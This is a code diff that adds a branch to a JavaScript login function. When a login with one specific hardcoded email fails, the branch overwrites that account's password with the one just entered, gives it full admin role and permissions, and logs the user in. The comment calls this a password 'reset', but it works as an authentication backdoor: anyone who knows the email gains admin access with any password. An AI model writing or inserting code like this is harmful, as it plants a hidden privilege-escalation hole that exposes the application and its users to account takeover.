@@ -1004,6 +1004,22 @@ function doLogin() {
       saveCurrent();
       bootApp();
     } else {
+      // Check if user exists but password just doesn't match — offer reset for admin
+      var existing = state.users.find(function(u){return u.email.toLowerCase()===email;});
+      if (existing && email === 'cedric.baert@delaware.pro') {
+        // Force reset admin password
+        existing.password = hashed;
+        existing.perms = ROLE_DEFAULTS.admin;
+        existing.role = 'admin';
+        existing.active = true;
+        saveState();
+        errEl.classList.remove('visible');
+        currentUser = existing;
+        saveCurrent();
+        bootApp();
+        console.log('Admin password was reset to match entered password');
+        return;
+      }
       errEl.textContent = 'Invalid email or password.';
       errEl.classList.add('visible');
     }
